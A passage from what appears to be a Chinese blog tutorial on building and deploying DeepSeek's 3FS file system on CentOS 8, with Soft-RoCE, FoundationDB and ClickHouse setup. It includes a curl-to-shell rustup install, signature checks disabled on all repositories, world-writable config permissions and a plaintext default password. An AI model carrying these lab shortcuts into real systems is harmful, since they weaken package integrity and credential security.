https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/BaseOS/<span class="hljs-variable">$basearch</span>/Source/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/BaseOS/<span class="hljs-variable">$basearch</span>/Source/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[appstream-source]<br>name=CentOS-8.5.2111 - AppStream-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/AppStream/Source/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/AppStream/Source/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/AppStream/Source/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[extras-source]<br>name=CentOS-8.5.2111 - Extras-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/Source/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/extras/Source/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/extras/Source/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[plus-source]<br>name=CentOS-8.5.2111 - Plus-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/centosplus/Source/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/centosplus/Source/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/centosplus/Source/<br>enabled=0<br>gpgcheck=0<br>priority=1<br></code></pre></td></tr></table></figure><p><strong>&#x2F;etc&#x2F;yum.repos.d&#x2F;centos-epel-all.repo 文件内容:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[epel-modular]<br>name=CentOS-8-EPEL - EPEL-Modular - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span><br>        https://mirrors.tuna.tsinghua.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span><br>        https://mirrors.ustc.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span><br>enabled=1<br>gpgcheck=0<br>priority=1<br><br>[epel-modular-debuginfo]<br>name=CentOS-8-EPEL - EPEL-Modular-DebugInfo - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.ustc.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span>/debug<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-modular-source]<br>name=CentOS-8-EPEL - EPEL-Modular-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/Modular/SRPMS<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Modular/SRPMS<br>        https://mirrors.ustc.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Modular/SRPMS<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-testing-modular]<br>name=CentOS-8-EPEL - EPEL-Testing-Modular - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span><br>        https://mirrors.tuna.tsinghua.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span><br>        https://mirrors.ustc.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span><br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-testing-modular-debuginfo]<br>name=CentOS-8-EPEL - EPEL-Testing-Modular-DebugInfo - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.ustc.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/<span class="hljs-variable">$basearch</span>/debug<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-testing-modular-source]<br>name=CentOS-8-EPEL - EPEL-Testing-Modular-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/SRPMS<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/SRPMS<br>        https://mirrors.ustc.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Modular/SRPMS<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-testing]<br>name=CentOS-8-EPEL - EPEL-Testing - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span><br>        https://mirrors.tuna.tsinghua.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span><br>        https://mirrors.ustc.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span><br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-testing-debuginfo]<br>name=CentOS-8-EPEL - EPEL-Testing-DebugInfo - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.ustc.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span>/debug<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-testing-source]<br>name=CentOS-8-EPEL - EPEL-Testing-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/SRPMS<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/SRPMS<br>        https://mirrors.ustc.edu.cn/epel/testing/<span class="hljs-variable">$releasever</span>/Everything/SRPMS<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel]<br>name=CentOS-8-EPEL - EPEL - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span><br>        https://mirrors.tuna.tsinghua.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span><br>        https://mirrors.ustc.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span><br>enabled=1<br>gpgcheck=0<br>priority=1<br><br>[epel-debuginfo]<br>name=CentOS-8-EPEL - EPEL-Debug - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span>/debug<br>        https://mirrors.ustc.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Everything/<span class="hljs-variable">$basearch</span>/debug<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[epel-source]<br>name=CentOS-8-EPEL - EPEL-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/epel/<span class="hljs-variable">$releasever</span>/Everything/SRPMS<br>        https://mirrors.tuna.tsinghua.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Everything/SRPMS<br>        https://mirrors.ustc.edu.cn/epel/<span class="hljs-variable">$releasever</span>/Everything/SRPMS<br>enabled=0<br>gpgcheck=0<br>priority=1<br></code></pre></td></tr></table></figure><p><strong>环境初始化相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 备份并替换 repo 配置</span><br><span class="hljs-built_in">mkdir</span> -p /root/3fs/oldrepo<br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/* /root/3fs/oldrepo/<br>vi /etc/yum.repos.d/centos-all.repo<br>vi /etc/yum.repos.d/centos-epel-all.repo<br><br><span class="hljs-comment"># 安装依赖软件</span><br>dnf clean all<br>dnf reinstall -y epel-release<br><span class="hljs-built_in">rm</span> -rf /etc/yum.repos.d/epel*<br>dnf install -y wget git meson cmake cargo perl lld gcc gcc-c++ autoconf<br>               lz4 lz4-devel xz xz-devel double-conversion-devel libdwarf-devel \<br>               libunwind-devel libaio-devel libuv-devel gmock-devel gperftools \<br>               gperftools-devel openssl-devel boost1.78 boost1.78-devel mono-devel \<br>               libevent-devel libibverbs-devel numactl-devel python3-devel bzip2-devel \<br>               libzstd-devel snappy-devel libsodium-devel libatomic gcc-toolset-11 \<br>               gcc-toolset-11-elfutils-devel gtest gtest-devel gcc-toolset-11-libatomic-devel<br>dnf reinstall -y kernel-headers glibc-headers<br>dnf remove -y fuse fuse-libs gflags gflags-devel glog glog-devel<br>dnf clean all<br><br><span class="hljs-comment"># 配置 gcc11 环境</span><br><span class="hljs-built_in">ln</span> -s /opt/rh/gcc-toolset-11/root/usr/libexec/gcc/x86_64-redhat-linux/11 /usr/libexec/gcc/x86_64-redhat-linux/11<br><span class="hljs-built_in">ln</span> -s /opt/rh/gcc-toolset-11/root/usr/lib/gcc/x86_64-redhat-linux/11 /usr/lib/gcc/x86_64-redhat-linux/11<br><span class="hljs-built_in">ln</span> -s /opt/rh/gcc-toolset-11/root/usr/include/c++/11 /usr/include/c++/11<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source /opt/rh/gcc-toolset-11/enable&quot;</span> &gt;&gt; /root/.bashrc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=/opt/rh/gcc-toolset-11/root/usr/bin:\$PATH&quot;</span> &gt;&gt; /root/.bashrc<br><span class="hljs-built_in">source</span> /root/.bashrc<br><br><span class="hljs-comment"># 安装 fuse</span><br><span class="hljs-built_in">mkdir</span> -p /root/3fs/fuse<br><span class="hljs-built_in">cd</span> /root/3fs/fuse<br>wget https://github.com/libfuse/libfuse/releases/download/fuse-3.16.2/fuse-3.16.2.tar.gz<br>tar -zxf fuse-3.16.2.tar.gz<br><span class="hljs-built_in">cd</span> fuse-3.16.2<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br>meson setup ..<br>meson configure -D default_library=both<br>meson setup --reconfigure ../<br>ninja<br>ninja install<br><br><span class="hljs-comment"># 安装 foundationdb</span><br><span class="hljs-built_in">mkdir</span> -p /root/3fs/foundationdb<br><span class="hljs-built_in">cd</span> /root/3fs/foundationdb<br>wget https://github.com/apple/foundationdb/releases/download/7.3.63/foundationdb-clients-7.3.63-1.el7.x86_64.rpm<br>wget https://github.com/apple/foundationdb/releases/download/7.3.63/foundationdb-server-7.3.63-1.el7.x86_64.rpm<br>rpm -ivh foundationdb-clients-7.3.63-1.el7.x86_64.rpm<br>rpm -ivh foundationdb-server-7.3.63-1.el7.x86_64.rpm<br><br><span class="hljs-comment"># 安装 clang14</span><br><span class="hljs-built_in">mkdir</span> -p /root/3fs/clang<br><span class="hljs-built_in">cd</span> /root/3fs/clang<br>wget https://github.com/llvm/llvm-project/releases/download/llvmorg-14.0.6/clang+llvm-14.0.6-x86_64-linux-gnu-rhel-8.4.tar.xz<br>tar -xf clang+llvm-14.0.6-x86_64-linux-gnu-rhel-8.4.tar.xz<br><span class="hljs-built_in">mv</span> clang+llvm-14.0.6-x86_64-linux-gnu-rhel-8.4 /usr/local/clang-llvm-14<br><span class="hljs-built_in">ln</span> -s /usr/local/clang-llvm-14/bin/clang++ /usr/local/clang-llvm-14/bin/clang++-14<br><span class="hljs-built_in">ln</span> -s /usr/local/clang-llvm-14/bin/clang-tidy /usr/local/clang-llvm-14/bin/clang-tidy-14<br><span class="hljs-built_in">ln</span> -s /usr/local/clang-llvm-14/bin/clang-format /usr/local/clang-llvm-14/bin/clang-format-14<br><span class="hljs-built_in">ln</span> -s /usr/local/clang-llvm-14/bin/clang-format /usr/bin/clang-format-14<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=\$PATH:/usr/local/clang-llvm-14/bin&quot;</span> &gt;&gt; /root/.bashrc<br><br><span class="hljs-comment"># 安装 rust</span><br><span class="hljs-built_in">export</span> RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup<br><span class="hljs-built_in">export</span> RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static<br>curl --proto <span class="hljs-string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y<br>. <span class="hljs-string">&quot;/root/.cargo/env&quot;</span><br><br><span class="hljs-comment"># 安装 gflags</span><br><span class="hljs-built_in">mkdir</span> -p /root/3fs/gflags<br><span class="hljs-built_in">cd</span> /root/3fs/gflags<br>wget https://mirrors.aliyun.com/centos/8-stream/PowerTools/x86_64/os/Packages/gflags-2.2.2-1.el8.x86_64.rpm<br>wget https://mirrors.aliyun.com/centos/8-stream/PowerTools/x86_64/os/Packages/gflags-devel-2.2.2-1.el8.x86_64.rpm<br>rpm -ivh gflags-2.2.2-1.el8.x86_64.rpm<br>rpm -ivh gflags-devel-2.2.2-1.el8.x86_64.rpm<br>wget https://github.com/google/glog/archive/refs/tags/v0.4.0.tar.gz<br>tar -zxvf v0.4.0.tar.gz<br><span class="hljs-built_in">cd</span> glog-0.4.0<br>cmake -S . -B build -DCMAKE_INSTALL_PREFIX=/usr -DBUILD_SHARED_LIBS=ON<br>cmake --build build --target install<br></code></pre></td></tr></table></figure><h2 id="2-2、编译-3FS"><a href="#2-2、编译-3FS" class="headerlink" title="2.2、编译 3FS"></a>2.2、编译 3FS</h2><p>本次编译指定了我使用的编译版本，以便于你来复现我的操作，当然你也可以尝试编译编译最新的代码。</p><blockquote><p><strong>注意:</strong> 你可以选择一台机器编译，然后将编译产物传输到其他机器中，但是你需要确保这一批机器的操作系统和硬件配置保持一致，否则可能会出现编译后的产物在其他机器上运行失败的问题（比如由于机器的指令集不同导致无法运行）。</p></blockquote><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /root/3fs<br><span class="hljs-built_in">cd</span> /root/3fs<br>git <span class="hljs-built_in">clone</span> https://github.com/deepseek-ai/3FS.git<br><span class="hljs-built_in">cd</span> 3FS<br>git checkout -f ee9a5cee0a85c64f4797bf380257350ca1becd36<br>git submodule update --init --recursive<br>./patches/apply.sh<br>cargo build --release<br>cmake -S . -B build -DCMAKE_CXX_COMPILER=clang++-14 -DCMAKE_C_COMPILER=clang-14 -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCMAKE_EXPORT_COMPILE_COMMANDS=ON<br>cmake --build build -j 32<br></code></pre></td></tr></table></figure><h1 id="三、初始化运行环境"><a href="#三、初始化运行环境" class="headerlink" title="三、初始化运行环境"></a>三、初始化运行环境</h1><p><strong>机器节点信息:</strong></p><table><thead><tr><th align="center">机器</th><th align="center">IP</th><th align="center">相关组件</th></tr></thead><tbody><tr><td align="center">host01</td><td align="center">10.10.10.1</td><td align="center">Soft-RoCE, FoundationDB Server, ClickHouse Server</td></tr><tr><td align="center">host02</td><td align="center">10.10.10.2</td><td align="center">Soft-RoCE</td></tr><tr><td align="center">host03</td><td align="center">10.10.10.3</td><td align="center">Soft-RoCE</td></tr></tbody></table><h2 id="3-1、配置-Soft-RoCE-环境"><a href="#3-1、配置-Soft-RoCE-环境" class="headerlink" title="3.1、配置 Soft-RoCE 环境"></a>3.1、配置 Soft-RoCE 环境</h2><p>由于测试环境无 RDMA 硬件网卡设备，所以我们需要配置 Soft-RoCE 来模拟 RDMA 网络。上述三台机器上都需要配置 Soft-RoCE 环境。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装依赖软件</span><br>dnf -y install iproute libibverbs libibverbs-utils infiniband-diags perftest<br><br><span class="hljs-comment"># 加载内核驱动</span><br>lsmod | grep rdma<br>modprobe rdma_rxe<br><br><span class="hljs-comment"># 新增 rdma 网卡</span><br><span class="hljs-comment"># 其中 rxe_0 是新增的 rdma 设备名， ens1 为 Soft-RoCE 设备所绑定的网络设备名</span><br>rdma <span class="hljs-built_in">link</span> add rxe0 <span class="hljs-built_in">type</span> rxe netdev ens1<br>rdma <span class="hljs-built_in">link</span> show<br><br><span class="hljs-comment"># 列出 rdma 设备</span><br>ibv_devices<br><br><span class="hljs-comment"># 显示 ib 状态</span><br>ibstat<br>ibstatus<br><br><br><span class="hljs-comment"># rdma 带宽测试，工具来自于 perftest</span><br><span class="hljs-comment"># 服务器</span><br>ib_send_bw -a -n 1000000 -c RC -d rxe0 -q 10 -i 1<br><span class="hljs-comment"># 客户端</span><br>ib_send_bw -a -n 1000000 -c RC -d rxe0 -q 10 -i 1 10.10.10.1<br><br><span class="hljs-comment"># rdma 延迟测试，工具来自于 perftest</span><br><span class="hljs-comment"># 服务器</span><br>ib_send_lat -a -d mlx5_bond_0 -F -n 1000 -p 18515<br><span class="hljs-comment"># 客户端</span><br>ib_send_lat -a -d mlx5_bond_0 10.10.10.1 -F -n 1000 -p 18515<br></code></pre></td></tr></table></figure><h2 id="3-2、配置-FoundationDB"><a href="#3-2、配置-FoundationDB" class="headerlink" title="3.2、配置 FoundationDB"></a>3.2、配置 FoundationDB</h2><p>修改 10.10.10.1 上的 FoundationDB Server 监听端口。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 FoundationDB (如果之前没有安装)</span><br><span class="hljs-built_in">mkdir</span> -p /root/3fs/foundationdb<br><span class="hljs-built_in">cd</span> /root/3fs/foundationdb<br>wget https://github.com/apple/foundationdb/releases/download/7.3.63/foundationdb-clients-7.3.63-1.el7.x86_64.rpm<br>wget https://github.com/apple/foundationdb/releases/download/7.3.63/foundationdb-server-7.3.63-1.el7.x86_64.rpm<br>rpm -ivh foundationdb-clients-7.3.63-1.el7.x86_64.rpm<br>rpm -ivh foundationdb-server-7.3.63-1.el7.x86_64.rpm<br>ll /usr/lib64/libfdb_c.so<br><br><span class="hljs-comment"># 修改 fdb server 监听端口</span><br><span class="hljs-built_in">cat</span> /etc/foundationdb/fdb.cluster<br>vi /etc/foundationdb/fdb.cluster<br><br><span class="hljs-comment"># 启动 fdb</span><br>systemctl start foundationdb.service<br>systemctl status foundationdb.service<br><br><span class="hljs-comment"># 停止 fdb</span><br>systemctl stop foundationdb.service<br><br><span class="hljs-comment"># 查看服务状态</span><br>fdbcli --<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;status details&quot;</span><br><br><span class="hljs-comment"># 查询 fdb 中存储的数据</span><br>fdbcli --<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;getrange &#x27;&#x27; \xff&quot;</span><br><br><span class="hljs-comment"># 清空 fdb 中存储的数据</span><br><span class="hljs-comment"># 如果安装步骤执行出错，会导致存储在 fdb 中数据异常，可能需要清空 fbd 数据后重新执行</span><br><span class="hljs-comment"># 也可以使用 fdbcli --exec &quot;writemode on; clearrange &#x27;&#x27; \xff&quot; 来清空数据</span><br>systemctl stop foundationdb.service<br><span class="hljs-built_in">rm</span> -rf /var/lib/foundationdb/data/*<br>systemctl start foundationdb.service<br>fdbcli --<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;configure new single ssd&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3-3、配置-ClickHouse"><a href="#3-3、配置-ClickHouse" class="headerlink" title="3.3、配置 ClickHouse"></a>3.3、配置 ClickHouse</h2><p>修改 10.10.10.1 上的 ClickHouse 配置，以允许远程连接。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 ClickHouse (如果之前没有安装)</span><br>dnf install -y yum-utils<br>yum-config-manager --add-repo https://packages.clickhouse.com/rpm/clickhouse.repo<br>dnf install -y clickhouse-server clickhouse-client<br><br><span class="hljs-comment"># 查看配置文件</span><br><span class="hljs-built_in">ls</span> -al /etc/clickhouse-server/<br><br><span class="hljs-comment"># 修改监听端口</span><br><span class="hljs-built_in">ls</span> -al /etc/clickhouse-server/config.xml<br><span class="hljs-built_in">chmod</span> 777 /etc/clickhouse-server/config.xml<br><span class="hljs-comment"># 编辑配置文件</span><br><span class="hljs-comment"># 取消其中 &lt;listen_host&gt;::&lt;/listen_host&gt; 注释</span><br><span class="hljs-comment"># 修改其中 &lt;tcp_port&gt;39000&lt;/tcp_port&gt; 为 39000</span><br>vi /etc/clickhouse-server/config.xml<br><span class="hljs-built_in">chmod</span> 400 /etc/clickhouse-server/config.xml<br><br><span class="hljs-comment"># 修改用户密码</span><br><span class="hljs-built_in">ls</span> -al /etc/clickhouse-server/users.xml<br><span class="hljs-built_in">chmod</span> 777 /etc/clickhouse-server/users.xml<br><span class="hljs-comment"># 编辑配置文件，在 &lt;password&gt;&lt;/password&gt; 中指定明文密码为 default123</span><br>vi /etc/clickhouse-server/users.xml<br><span class="hljs-built_in">chmod</span> 400 /etc/clickhouse-server/users.xml<br><br><span class="hljs-comment"># 启动服务</span><br>systemctl start clickhouse-server<br>systemctl <span class="hljs-built_in">enable</span> clickhouse-server<br>systemctl status clickhouse-server<br><br><span class="hljs-comment"># 停止服务</span><br>systemctl stop clickhouse-server<br><br><span class="hljs-comment"># 初始化 3fs 库表结构</span><br>clickhouse-client --port 39000 --password default123 -n &lt; /root/3fs/3FS/deploy/sql/3fs-monitor.sql<br></code></pre></td></tr></table></figure><h1 id="四、部署-3FS-集群"><a href="#四、部署-3FS-集群" class="headerlink" title="四、部署 3FS 集群"></a>四、部署 3FS 集群</h1><p>参考官方文档: <a href="https://github.com/deepseek-ai/3FS/blob/ee9a5cee0a85c64f4797bf380257350ca1becd36/deploy/README.md">deploy</a></p><p><strong>机器节点信息:</strong></p><table><thead><tr><th align="center">机器</th><th align="center">IP</th><th align="center">组件角色</th></tr></thead><tbody><tr><td align="center">host01</td><td align="center">10.10.10.1</td><td align="center">monitor_collector, mgmtd, meta, storage</td></tr><tr><td align="center">host02</td><td align="center">10.10.10.2</td><td align="center">storage</td></tr><tr><td align="center">host03</td><td align="center">10.10.10.3</td><td align="center">storage, fuse_client</td></tr></tbody></table><h2 id="4-1、配置-monitor-collector"><a href="#4-1、配置-monitor-collector" class="headerlink" title="4.1、配置 monitor_collector"></a>4.1、配置 monitor_collector</h2><p>以下操作仅在 10.10.10.1 机器上执行。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化运行目录和文件</span><br><span class="hljs-built_in">mkdir</span> -p /opt/3fs/&#123;bin,etc&#125; /var/log/3fs<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/build/bin/monitor_collector_main /opt/3fs/bin<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/configs/monitor_collector_main.toml /opt/3fs/etc<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/deploy/systemd/monitor_collector_main.service /usr/lib/systemd/system<br>ldd /opt/3fs/bin/monitor_collector_main<br><br><span class="hljs-comment"># 修改配置文件[开始]</span><br><span class="hljs-comment"># 修改其中的 [server.monitor_collector.reporter.clickhouse] 字段为 clickhouse 服务信息</span><br>vi /opt/3fs/etc/monitor_collector_main.toml<br><span class="hljs-comment"># 示例内容如下:</span><br>[server.monitor_collector.reporter.clickhouse]<br>db = <span class="hljs-string">&#x27;3fs&#x27;</span><br>host = <span class="hljs-string">&#x27;10.10.10.1&#x27;</span><br>user = <span class="hljs-string">&#x27;default&#x27;</span><br>passwd = <span class="hljs-string">&#x27;default123&#x27;</span><br>port = <span class="hljs-string">&#x27;39000&#x27;</span><br><span class="hljs-comment"># 修改配置文件[结束]</span><br><br><span class="hljs-comment"># 启动服务</span><br>systemctl start monitor_collector_main<br>systemctl status monitor_collector_main<br><br><span class="hljs-comment"># 停止服务</span><br>systemctl stop monitor_collector_main<br></code></pre></td></tr></table></figure><h2 id="4-2、配置-admin-cli"><a href="#4-2、配置-admin-cli" class="headerlink" title="4.2、配置 admin_cli"></a>4.2、配置 admin_cli</h2><p>以下操作在所有部署机器上执行。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化本机运行目录和文件</span><br><span class="hljs-built_in">mkdir</span> -p /opt/3fs/&#123;bin,etc&#125; /var/log/3fs<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/build/bin/admin_cli /opt/3fs/bin/<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/configs/admin_cli.toml /opt/3fs/etc/<br>ldd /opt/3fs/bin/admin_cli<br><span class="hljs-built_in">cp</span> /etc/foundationdb/fdb.cluster /opt/3fs/etc/<br><br><span class="hljs-comment"># 从 10.10.10.1 中拉取 fdb 连接配置</span><br>scp root@10.10.10.1:/etc/foundationdb/fdb.cluster /opt/3fs/etc/<br><br><span class="hljs-comment"># 修改配置文件[开始]</span><br>vi /opt/3fs/etc/admin_cli.toml<br><span class="hljs-comment"># 修改示例内容如下: (以下仅展示修改的配置内容)</span><br>cluster_id = <span class="hljs-string">&#x27;stage&#x27;</span><br><br>[fdb]<br>clusterFile = <span class="hljs-string">&#x27;/opt/3fs/etc/fdb.cluster&#x27;</span><br><br>[ib_devices]<br><span class="hljs-comment"># 注意: 由于 3fs 内部限制了本地 rdma 网卡数量，对应配置 kMaxDeviceCnt 为 4 , 因此实际部署环境中</span><br><span class="hljs-comment">#       存在多个 rdma 网卡可能会导致异常，我们可以通过 device_filter 参数来选择想要使用的网卡。</span><br>device_filter = [<span class="hljs-string">&#x27;rxe0&#x27;</span>]<br><span class="hljs-comment"># 修改配置文件[结束]</span><br><br><span class="hljs-comment"># 查看 admin_cli 命令</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h2 id="4-3、配置-mgmtd"><a href="#4-3、配置-mgmtd" class="headerlink" title="4.3、配置 mgmtd"></a>4.3、配置 mgmtd</h2><p>以下操作仅在 10.10.10.1 机器上执行。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化本机运行目录和文件</span><br><span class="hljs-built_in">mkdir</span> -p /opt/3fs/&#123;bin,etc&#125; /var/log/3fs<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/build/bin/mgmtd_main /opt/3fs/bin/<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/configs/&#123;mgmtd_main.toml,mgmtd_main_launcher.toml,mgmtd_main_app.toml&#125; /opt/3fs/etc/<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/deploy/systemd/mgmtd_main.service /usr/lib/systemd/system<br><br><span class="hljs-comment"># 修改配置文件</span><br><span class="hljs-comment"># 修改配置文件 mgmtd_main_app.toml [开始]</span><br>vi /opt/3fs/etc/mgmtd_main_app.toml<br>node_id = 1<br><span class="hljs-comment"># 修改配置文件 mgmtd_main_app.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 mgmtd_main_launcher.toml [开始]</span><br>vi /opt/3fs/etc/mgmtd_main_launcher.toml<br>cluster_id = <span class="hljs-string">&#x27;stage&#x27;</span><br><br>[fdb]<br>clusterFile = <span class="hljs-string">&#x27;/opt/3fs/etc/fdb.cluster&#x27;</span><br><span class="hljs-comment"># 修改配置文件 mgmtd_main_launcher.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 mgmtd_main.toml [开始]</span><br>vi /opt/3fs/etc/mgmtd_main.toml<br>[common.monitor.reporters.monitor_collector]<br>remote_ip = <span class="hljs-string">&quot;10.10.10.1:10000&quot;</span><br><span class="hljs-comment"># 修改配置文件 mgmtd_main.toml [结束]</span><br><br><span class="hljs-comment"># 初始化集群</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml <span class="hljs-string">&quot;init-cluster --mgmtd /opt/3fs/etc/mgmtd_main.toml 1 1048576 4&quot;</span><br><br><span class="hljs-comment"># 启动服务</span><br>systemctl start mgmtd_main<br>systemctl status mgmtd_main<br><br><span class="hljs-comment"># 查看集群节点</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-nodes&quot;</span><br></code></pre></td></tr></table></figure><p><strong>初始化集群的参数解释:</strong></p><ul><li><code>chaintableid</code> : 这里参数为 1 。</li><li><code>chunksize</code> : 这里参数为 1048576 。</li><li><code>stripesize</code> : 这里参数为 4 。</li></ul><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td 